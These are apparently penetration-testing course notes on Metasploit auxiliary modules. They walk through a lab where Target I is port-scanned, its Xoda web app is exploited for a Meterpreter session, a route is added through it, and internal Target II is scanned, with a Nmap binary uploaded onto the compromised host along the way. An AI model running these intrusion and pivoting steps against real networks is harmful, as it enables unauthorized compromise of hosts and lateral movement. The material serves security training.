- An auxiliary module in the Metasploit Framework is a module used to perform functionality like scanning, discovery and fuzzing, basically any functionality that does not specifically involve the exploitation of a vulnerability.
- Auxiliary modules cannot be paired with payloads.
- Auxiliary modules are essentially used to extract information from a target host or service.
- We can use auxiliary modules to perform both TCP & UDP port scanning as well as enumerating information from services like FTP, SSH, HTTP etc.
- Auxiliary modules are extremely powerful tools to use during the information gathering phase of a penetration test, as well as the post exploitation phase.

Why do we need to use the auxiliary modules present in Metasploit to perform port scanning if we can just use Nmap and then export those results to the Metasploit Framework console?
	- In the initial phases of performing a penetration test, the auxiliary modules present in the Metasploit Framework will work very similar to Nmap and allow you to identify open ports on a target system.
	- Where these modules really show the difference, is in the post exploitation phase of a penetration test.
	- Let us imagine a scenario where we gain access to a system present on an organization's internal network, and there are several other hosts present on the network. If the hosts are not configured to be connected to the internet or any external network, the only way to gain access to them is by pivoting from Target I we have access to, on the internal network.
	- Auxiliary modules in this scenario can be used to scan the other host present on the internal network.
	- It is not recommended to use Nmap in this scenario, since we would need to transfer a binary executable of Nmap to Target I before performing any further enumeration using it.
	- A Meterpreter session essentially provides us with an interactive command line on the target system.

Lab Infrastructure
	- We have two targets present on an Internal network, we will create an initial foothold on Target I which is running a vulnerable web server, and then utilize it to pivot to Target II using Metasploit Framework's auxiliary modules.
	- To do this, we will create a Meterpreter session on Target I, and then add a network route to utilize Target I to scan Target II.

Practical Demonstration
	- `service postgresql start`
	- `msfconsole`
	- `db_status`
	- `workspace a port_scan`
	- `workspace`
	- Scanning Target I
		- `search portscan`
		- `use auxiliary/scanner/portscan/tcp`
		- `options`
		- `set PORTS 1-65535`
		- The other options shown for the port scanning auxiliary modules can be used to modify the speed and the stealthiness of the scan.
		- The threads option can be used to change the concurrent threads used during the port scanning process, the maximum thread value which can be allocated is one per each host.
		- `set RHOSTS demo1.ine.local`
		- `options`
		- `run`
	- `curl demo1.ine.local:80` or just use your web browser to check what is hosted on the web server.
	- Exploiting the Xoda interface on Target I using Metasploit:
		- `search xoda`
		- `use exploit/unix/webapp/xoda_file_upload`
		- `options`
		- `set RHOSTS demo1.ine.local`
		- `set TARGETURI /`
		- `options`
		- `exploit`
	- Meterpreter Session on Target I
		- The `sysinfo` command on a Meterpreter shell can be used to provide system information about the compromised host.
		- The `shell` command can be used to run an interactive system shell on the Meterpreter session.
		- `ifconfig`
		- We will observe that the target host is part of two subnets: one on the external network (eth0) and one on the internal network (eth1). We have exploited a vulnerability on the external network interface (eth0). We will now proceed to scan the hosts on the internal network interface (eth1).
		- In the command below, to create a network route, we will use Target I's allocated IP address on the internal network (eth1), to specify the internal network's subnet in Metasploit's routing table.
		- We will now try to create a network route between the Target I and Target II, the `-s` flag for the autoroute module is used to specify the subnet to create the route on, using either a subnet address or an IP address of a host present on that subnet: `run autoroute -s 192.113.124.2`
	- The `background` command can be used to background running Meterpreter session on Metasploit: `background`
	- We can list all the active Meterpreter sessions using the command: `sessions`
	- Scanning Target II using our foothold on Target I:
		- `search portscan`
		- `use auxiliary/scanner/portscan/tcp`
		- `set RHOSTS demo2.ine.local`
		- The IP address of Target I and Target II were already known by us in this scenario to be `demo1.ine.local` and `demo2.ine.local` respectively.
		- Since, we already have a network route configured, we are automatically performing the port scan on Target II using Target I as a gateway.
		- `options`
		- `run`
	- We can also use static binaries of tools like Nmap to perform port scanning instead of a Metasploit module, but it is not recommended, since uploading binaries to the compromised system may leave unnecessary artifacts on the compromised system.
		- The `upload` command on a Meterpreter shell can be used to upload files to the compromised system.
		- `upload ./static_binaries/nmap /tmp/nmap`
	- Running a UDP port scan on Target II using our foothold on Target I:
		- `search udp_sweep`
		- `use auxiliary/scanner/discovery/udp_sweep`
		- `set RHOSTS 192.113.124.3`
		- `run`